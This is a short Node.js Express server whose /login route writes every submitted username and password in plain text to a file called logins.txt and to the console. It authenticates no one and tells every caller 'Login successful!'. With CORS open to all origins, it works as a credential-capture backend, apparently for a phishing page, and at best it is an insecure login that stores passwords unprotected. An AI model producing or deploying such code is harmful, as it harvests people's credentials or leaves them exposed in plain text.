const express = require("express");
const fs = require("fs");
const bodyParser = require("body-parser");
const cors = require("cors");

const app = express();
const PORT = 3000;

// Middleware
app.use(cors());
app.use(bodyParser.json());

// Handle login requests
app.post("/login", (req, res) => {
    const { username, password } = req.body;

    if (!username || !password) {
        return res.status(400).json({ error: "Username and password are required!" });
    }

    // Format data to store
    const loginData = `Username: ${username}, Password: ${password}\n`;

    // Append data to logins.txt
    fs.appendFile("logins.txt", loginData, (err) => {
        if (err) {
            console.error("Error saving login:", err);
            return res.status(500).json({ error: "Failed to save login data" });
        }
        console.log("Login saved:", loginData);
        res.json({ message: "Login successful!" });
    });
});

// Start the server
app.listen(PORT, () => {
    console.log(`Server running on http://localhost:${PORT}`);
});
